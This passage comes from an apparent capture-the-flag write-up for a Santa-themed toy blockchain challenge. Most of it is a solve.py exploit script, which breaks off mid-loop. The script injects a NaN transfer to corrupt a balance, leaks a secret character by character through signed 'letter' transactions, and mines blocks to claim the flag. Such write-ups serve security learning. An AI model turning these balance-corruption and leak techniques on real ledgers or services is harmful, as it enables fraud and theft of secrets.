</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">scan_recent_blocks</span><span class="p">(</span><span class="n">depth</span><span class="o">=</span><span class="mi">15</span><span class="p">):</span>
    <span class="n">txs</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">_</span><span class="p">,</span> <span class="n">blk</span> <span class="o">=</span> <span class="nf">get_block</span><span class="p">()</span>
        <span class="c1"># Traverse backwards via prev_hash
</span>        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">depth</span><span class="p">):</span>
            <span class="n">txs</span><span class="p">.</span><span class="nf">extend</span><span class="p">(</span><span class="n">blk</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">txs</span><span class="sh">"</span><span class="p">,</span> <span class="p">[]))</span>
            <span class="n">ph</span> <span class="o">=</span> <span class="n">blk</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">prev_hash</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">ph</span> <span class="ow">or</span> <span class="n">ph</span><span class="p">.</span><span class="nf">startswith</span><span class="p">(</span><span class="sh">"</span><span class="s">0</span><span class="sh">"</span><span class="o">*</span><span class="mi">32</span><span class="p">):</span> <span class="k">break</span>
            <span class="n">_</span><span class="p">,</span> <span class="n">blk</span> <span class="o">=</span> <span class="nf">get_block</span><span class="p">(</span><span class="n">ph</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span> <span class="k">pass</span>
    <span class="k">return</span> <span class="n">txs</span>
</pre></table></code></div></div><h4 id="get-flag"><span class="me-2">Get Flag</span><a href="#get-flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Once the 32 requests are processed, we reconstruct the <code class="language-plaintext highlighter-rouge">SECRET_GIFT</code> string from the gifts received. The final step is:</p><ul><li>Construct a letter containing the full secret string.<li>Mine a block containing this letter.<li>Mine 6 padding blocks again to force Santa to process it.<li>Wait for the final gift transaction, which will contain the flag.<div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="k">def</span> <span class="nf">step3_flag</span><span class="p">(</span><span class="n">priv</span><span class="p">,</span> <span class="n">sec</span><span class="p">):</span>
  <span class="c1"># Construct letter with the full secret
</span>  <span class="n">n</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">flag-</span><span class="si">{</span><span class="n">uuid</span><span class="p">.</span><span class="nf">uuid4</span><span class="p">()</span><span class="si">}</span><span class="sh">"</span>
  <span class="n">tx</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">src</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">hacker</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">dst</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">santa</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">letter</span><span class="sh">"</span><span class="p">,</span> 
        <span class="sh">"</span><span class="s">letter</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">LETTER_HEADER</span><span class="si">}{</span><span class="n">sec</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">:</span> <span class="n">n</span><span class="p">}</span>
  <span class="nf">sign_tx</span><span class="p">(</span><span class="n">priv</span><span class="p">,</span> <span class="n">tx</span><span class="p">)</span>
    
  <span class="c1"># Mine and Pad
</span>  <span class="nf">mine_block</span><span class="p">([</span><span class="n">tx</span><span class="p">])</span>
  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">CONFIRMATION_DEPTH</span><span class="p">):</span>
      <span class="nf">mine_block</span><span class="p">([])</span>

  <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="se">\n</span><span class="s">&gt;&gt;&gt; FLAG: </span><span class="si">{</span><span class="n">tx</span><span class="p">[</span><span class="sh">'</span><span class="s">gift</span><span class="sh">'</span><span class="p">]</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
</pre></table></code></div></div></ul><details> <summary>Click to view <code>solve.py</code></summary><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/env python3
</span><span class="kn">import</span> <span class="n">hashlib</span>
<span class="kn">import</span> <span class="n">json</span>
<span class="kn">import</span> <span class="n">math</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">time</span>
<span class="kn">import</span> <span class="n">uuid</span>
<span class="kn">from</span> <span class="n">pathlib</span> <span class="kn">import</span> <span class="n">Path</span>
<span class="kn">import</span> <span class="n">requests</span>
<span class="kn">from</span> <span class="n">cryptography.hazmat.primitives</span> <span class="kn">import</span> <span class="n">serialization</span>

<span class="n">BASE_URL</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">NORTH_POOLE</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">http://localhost</span><span class="sh">"</span><span class="p">)</span>
<span class="n">KEY_PATH</span> <span class="o">=</span> <span class="nc">Path</span><span class="p">(</span><span class="sh">"</span><span class="s">/challenge/keys/hacker/key</span><span class="sh">"</span><span class="p">)</span>
<span class="n">LETTER_HEADER</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Dear Santa,</span><span class="se">\n\n</span><span class="s">For christmas this year I would like </span><span class="sh">"</span>
<span class="n">DIFFICULTY</span> <span class="o">=</span> <span class="mi">16</span>
<span class="n">DIFF_PREFIX</span> <span class="o">=</span> <span class="sh">"</span><span class="s">0</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">DIFFICULTY</span> <span class="o">//</span> <span class="mi">4</span><span class="p">)</span>
<span class="n">CONFIRMATION_DEPTH</span> <span class="o">=</span> <span class="mi">6</span>

<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nc">Session</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">print_progress</span><span class="p">(</span><span class="n">current</span><span class="p">,</span> <span class="n">total</span><span class="p">,</span> <span class="n">prefix</span><span class="o">=</span><span class="sh">''</span><span class="p">,</span> <span class="n">suffix</span><span class="o">=</span><span class="sh">''</span><span class="p">,</span> <span class="n">length</span><span class="o">=</span><span class="mi">30</span><span class="p">):</span>
    <span class="n">filled</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">length</span> <span class="o">*</span> <span class="n">current</span> <span class="o">//</span> <span class="n">total</span><span class="p">)</span>
    <span class="n">bar</span> <span class="o">=</span> <span class="sh">"</span><span class="s">‚ñà</span><span class="sh">"</span> <span class="o">*</span> <span class="n">filled</span> <span class="o">+</span> <span class="sh">"</span><span class="s">-</span><span class="sh">"</span> <span class="o">*</span> <span class="p">(</span><span class="n">length</span> <span class="o">-</span> <span class="n">filled</span><span class="p">)</span>
    <span class="n">percent</span> <span class="o">=</span> <span class="sh">"</span><span class="s">{:.1f}</span><span class="sh">"</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="mi">100</span> <span class="o">*</span> <span class="p">(</span><span class="n">current</span> <span class="o">/</span> <span class="nf">float</span><span class="p">(</span><span class="n">total</span><span class="p">)))</span>
    <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="se">\r</span><span class="si">{</span><span class="n">prefix</span><span class="si">}</span><span class="s"> |</span><span class="si">{</span><span class="n">bar</span><span class="si">}</span><span class="s">| </span><span class="si">{</span><span class="n">percent</span><span class="si">}</span><span class="s">% </span><span class="si">{</span><span class="n">suffix</span><span class="si">}</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">flush</span><span class="p">()</span>
    <span class="k">if</span> <span class="n">current</span> <span class="o">==</span> <span class="n">total</span><span class="p">:</span>
        <span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">log</span><span class="p">(</span><span class="n">msg</span><span class="p">):</span>
    <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[*] </span><span class="si">{</span><span class="n">msg</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">load_key</span><span class="p">():</span>
    <span class="k">with</span> <span class="nf">open</span><span class="p">(</span><span class="n">KEY_PATH</span><span class="p">,</span> <span class="sh">"</span><span class="s">rb</span><span class="sh">"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">serialization</span><span class="p">.</span><span class="nf">load_ssh_private_key</span><span class="p">(</span><span class="n">f</span><span class="p">.</span><span class="nf">read</span><span class="p">(),</span> <span class="n">password</span><span class="o">=</span><span class="bp">None</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">hash_block</span><span class="p">(</span><span class="n">block</span><span class="p">):</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">block</span><span class="p">,</span> <span class="n">sort_keys</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">),</span> <span class="n">allow_nan</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha256</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">hexdigest</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">get_block</span><span class="p">(</span><span class="n">h</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">hash</span><span class="sh">"</span><span class="p">:</span> <span class="n">h</span><span class="p">}</span> <span class="k">if</span> <span class="n">h</span> <span class="k">else</span> <span class="p">{}</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s">/block</span><span class="sh">"</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">p</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">r</span><span class="p">.</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">hash</span><span class="sh">"</span><span class="p">],</span> <span class="n">r</span><span class="p">.</span><span class="nf">json</span><span class="p">()[</span><span class="sh">"</span><span class="s">block</span><span class="sh">"</span><span class="p">]</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">time</span><span class="p">.</span><span class="nf">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">get_block</span><span class="p">(</span><span class="n">h</span><span class="p">)</span>
    
<span class="k">def</span> <span class="nf">to_json_str</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">sort_keys</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">),</span> <span class="n">allow_nan</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">mine_block</span><span class="p">(</span><span class="n">txs</span><span class="p">,</span> <span class="n">nice</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
    <span class="n">prev_hash</span><span class="p">,</span> <span class="n">prev_block</span> <span class="o">=</span> <span class="nf">get_block</span><span class="p">()</span>
    <span class="n">block</span> <span class="o">=</span> <span class="p">{</span>
        <span class="sh">"</span><span class="s">index</span><span class="sh">"</span><span class="p">:</span> <span class="n">prev_block</span><span class="p">[</span><span class="sh">"</span><span class="s">index</span><span class="sh">"</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="sh">"</span><span class="s">prev_hash</span><span class="sh">"</span><span class="p">:</span> <span class="n">prev_hash</span><span class="p">,</span> 
        <span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span> <span class="sh">"</span><span class="s">txs</span><span class="sh">"</span><span class="p">:</span> <span class="n">txs</span><span class="p">,</span> <span class="sh">"</span><span class="s">nice</span><span class="sh">"</span><span class="p">:</span> <span class="n">nice</span>
    <span class="p">}</span>
    
    <span class="n">nonce</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">block</span><span class="p">[</span><span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="n">nonce</span>
        <span class="n">h</span> <span class="o">=</span> <span class="nf">hash_block</span><span class="p">(</span><span class="n">block</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">h</span><span class="p">.</span><span class="nf">startswith</span><span class="p">(</span><span class="n">DIFF_PREFIX</span><span class="p">):</span> <span class="k">break</span>
        <span class="n">nonce</span> <span class="o">+=</span> <span class="mi">1</span>
    
    <span class="k">try</span><span class="p">:</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="nf">to_json_str</span><span class="p">(</span><span class="n">block</span><span class="p">)</span>
        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">Content-Type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">application/json</span><span class="sh">"</span><span class="p">}</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s">/block</span><span class="sh">"</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">r</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span> <span class="k">return</span> <span class="n">h</span>
        <span class="k">else</span><span class="p">:</span> <span class="k">return</span> <span class="nf">mine_block</span><span class="p">(</span><span class="n">txs</span><span class="p">,</span> <span class="n">nice</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span> <span class="k">return</span> <span class="nf">mine_block</span><span class="p">(</span><span class="n">txs</span><span class="p">,</span> <span class="n">nice</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">sign_tx</span><span class="p">(</span><span class="n">priv</span><span class="p">,</span> <span class="n">tx</span><span class="p">):</span>
    <span class="n">t</span> <span class="o">=</span> <span class="n">tx</span><span class="p">[</span><span class="sh">"</span><span class="s">type</span><span class="sh">"</span><span class="p">]</span>
    <span class="n">p</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">src</span><span class="sh">"</span><span class="p">:</span> <span class="n">tx</span><span class="p">[</span><span class="sh">"</span><span class="s">src</span><span class="sh">"</span><span class="p">],</span> <span class="sh">"</span><span class="s">dst</span><span class="sh">"</span><span class="p">:</span> <span class="n">tx</span><span class="p">[</span><span class="sh">"</span><span class="s">dst</span><span class="sh">"</span><span class="p">],</span> <span class="sh">"</span><span class="s">type</span><span class="sh">"</span><span class="p">:</span> <span class="n">t</span><span class="p">,</span> <span class="n">t</span><span class="p">:</span> <span class="n">tx</span><span class="p">[</span><span class="n">t</span><span class="p">],</span> <span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">:</span> <span class="n">tx</span><span class="p">[</span><span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">]}</span>
    <span class="n">msg</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">sort_keys</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">separators</span><span class="o">=</span><span class="p">(</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="p">),</span> <span class="n">allow_nan</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
    <span class="n">tx</span><span class="p">[</span><span class="sh">"</span><span class="s">sig</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="n">priv</span><span class="p">.</span><span class="nf">sign</span><span class="p">(</span><span class="n">hashlib</span><span class="p">.</span><span class="nf">sha256</span><span class="p">(</span><span class="n">msg</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">digest</span><span class="p">()).</span><span class="nf">hex</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">scan_recent_blocks</span><span class="p">(</span><span class="n">depth</span><span class="o">=</span><span class="mi">15</span><span class="p">):</span>
    <span class="n">txs</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">_</span><span class="p">,</span> <span class="n">blk</span> <span class="o">=</span> <span class="nf">get_block</span><span class="p">()</span>
        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">depth</span><span class="p">):</span>
            <span class="n">txs</span><span class="p">.</span><span class="nf">extend</span><span class="p">(</span><span class="n">blk</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">txs</span><span class="sh">"</span><span class="p">,</span> <span class="p">[]))</span>
            <span class="n">ph</span> <span class="o">=</span> <span class="n">blk</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">prev_hash</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">if</span> <span class="ow">not</span> <span class="n">ph</span> <span class="ow">or</span> <span class="n">ph</span><span class="p">.</span><span class="nf">startswith</span><span class="p">(</span><span class="sh">"</span><span class="s">0</span><span class="sh">"</span><span class="o">*</span><span class="mi">32</span><span class="p">):</span> <span class="k">break</span>
            <span class="n">_</span><span class="p">,</span> <span class="n">blk</span> <span class="o">=</span> <span class="nf">get_block</span><span class="p">(</span><span class="n">ph</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span> <span class="k">pass</span>
    <span class="k">return</span> <span class="n">txs</span>

<span class="k">def</span> <span class="nf">step1_nan</span><span class="p">(</span><span class="n">priv</span><span class="p">):</span>
    <span class="nf">log</span><span class="p">(</span><span class="sh">"</span><span class="s">Step 1: Hack NaN Balance...</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">_</span><span class="p">,</span> <span class="n">h</span> <span class="o">=</span> <span class="nf">get_block</span><span class="p">()</span>
        <span class="n">b</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s">/balances</span><span class="sh">"</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">hash</span><span class="sh">"</span><span class="p">:</span> <span class="nf">hash_block</span><span class="p">(</span><span class="n">h</span><span class="p">)}).</span><span class="nf">json</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">math</span><span class="p">.</span><span class="nf">isnan</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="sh">"</span><span class="s">balances</span><span class="sh">"</span><span class="p">].</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">hacker</span><span class="sh">"</span><span class="p">,</span> <span class="mi">0</span><span class="p">)):</span>
            <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">   -&gt; Skip.</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">return</span>
    <span class="k">except</span><span class="p">:</span> <span class="k">pass</span>

    <span class="n">tx</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">src</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">hacker</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">dst</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">hacker</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">transfer</span><span class="sh">"</span><span class="p">,</span> 
          <span class="sh">"</span><span class="s">transfer</span><span class="sh">"</span><span class="p">:</span> <span class="nf">float</span><span class="p">(</span><span class="sh">"</span><span class="s">nan</span><span class="sh">"</span><span class="p">),</span> <span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="s">nan-</span><span class="si">{</span><span class="n">uuid</span><span class="p">.</span><span class="nf">uuid4</span><span class="p">()</span><span class="si">}</span><span class="sh">"</span><span class="p">}</span>
    <span class="nf">sign_tx</span><span class="p">(</span><span class="n">priv</span><span class="p">,</span> <span class="n">tx</span><span class="p">)</span>
    <span class="nf">mine_block</span><span class="p">([</span><span class="n">tx</span><span class="p">])</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">   -&gt; Done.</span><span class="sh">"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">step2_leak</span><span class="p">(</span><span class="n">priv</span><span class="p">):</span>
    <span class="nf">log</span><span class="p">(</span><span class="sh">"</span><span class="s">Step 2: Leaking Secret...</span><span class="sh">"</span><span class="p">)</span>
    
    <span class="n">txs</span><span class="p">,</span> <span class="n">map_nonce</span> <span class="o">=</span> <span class="p">[],</span> <span class="p">{}</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">32</span><span class="p">):</span>
        <span class="n">n</span> <span class="o">=</span> <span class="nf">str</span><span class="p">(</span><span class="n">uuid</span><span class="p">.</span><span class="nf">uuid4</span><span class="p">())</span>
        <span class="n">map_nonce</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="n">i</span>
        <span class="n">tx</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">src</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">hacker</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">dst</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">santa</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">type</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">letter</span><span class="sh">"</span><span class="p">,</span> 
              <span class="sh">"</span><span class="s">letter</span><span class="sh">"</span><span class="p">:</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">LETTER_HEADER</span><span class="si">}</span><span class="s">secret index #</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">nonce</span><span class="sh">"</span><span class="p">:</span> <span class="n">n</span><span class="p">}</span>
        <span class="nf">sign_tx</span><span class="p">(</span><span class="n">priv</span><span class="p">,</span> <span class="n">tx</span><span class="p">)</span>
        <span class="n">txs</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">tx</span><span class="p">)</span>
    
    <span class="nf">mine_block</span><span class="p">(</span><span class="n">txs</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">CONFIRMATION_DEPTH</span><span class="p">):</span>
        <span class="nf">mine_block</span><span class="p">([])</span>
        <span class="nf">print_progress</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="n">CONFIRMATION_DEPTH</span><span class="p">,</span> <span class="n">prefix</span><span class="o">=</span><span class="sh">"</span><span class="s">   Padding</span><span class="sh">"</span><span class="p">,</span> <span class="n">suffix</span><span class="o">=</span><span class="sa">f</span><span class="sh">"</span><span class="s">Block </span><span class="si">{</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>

    <span class="nf">log</span><span class="p">(</span><span class="sh">"</span><span class="s">Scanning...</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">chars</span> <span class="o">=</span> <span class="p">[</span><span class="bp">None</span><span class="p">]</span> <span class="o">*</span> <span class="mi">32</span>
    <span class="n">found</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span>
    
    <span class="nf">print_progress</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="n">prefix</span><span class="o">=</span><span class="sh">"</span><span class="s">   Finding</span><span class="sh">"</span><span class="p">,</span> <span class="n">suffix</span><span class="o">=</span><span class="sh">"</span><span class="s">Secret: </span><span class="sh">"</span> <span class="o">+</span> <span class="sh">"</span><span class="s">_</span><span class="sh">"</span><span class="o">*</span><span class="mi">32</span><span class="p">)</span>

    <span class="k">while</span> <span class="n">found</span> <span class="o">&lt;</span> <span class="mi">32</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">time</span><span class="p">.</span><span class="nf">time</span><span class="p">()</span> <span class="o">-</span> <span class="n">start</span> <span class="o">&gt;</span> <span class="mi">120</span><span class="p">:</span> <span class="k">break</span>
        
        <span class="c1"># Scan
</span>        <span class="k">try</span><span class="p">:</span> <span class="n">pool</span> <span class="o">=</span> <span class="n">session</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">BASE_URL</span><span class="si">}</span><span class="s">/txpool</span><span class="sh">"</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">).</span><span class="nf">json</span><span class="p">().</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">txs</span><span class="sh">"</span><span class="p">,</span> <span class="p">[])</span>
        <span class="k">except</span><span class="p">:</span> <span class="n">pool</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="n">all_txs</span> <span class="o">=</span> <span class="n">pool</span> <span class="o">+</span> <span class="nf">scan_recent_blocks</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
        
        <span class="n">updated</span> <span class="o">=</span> <span class="bp">False</span>
        <span class="k">for</span> <span class="n">tx</span> <span class="ow">in</span> <span class="n">all_txs</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">tx</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">type</span><span class="sh">"</span><span class="p">)</span> <span class="o">==</span> <span class="sh">"</span><span class="s">gift</span><span class="sh">"</span> <span class="ow">and</span> <span class="n">tx</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">dst</span><span class="sh">"</span><span class="p">)</span> <span class="o">==</span> <span class="sh">"</span><span class="s">hacker</span><span class="sh">"</span><span class="p">:</span>
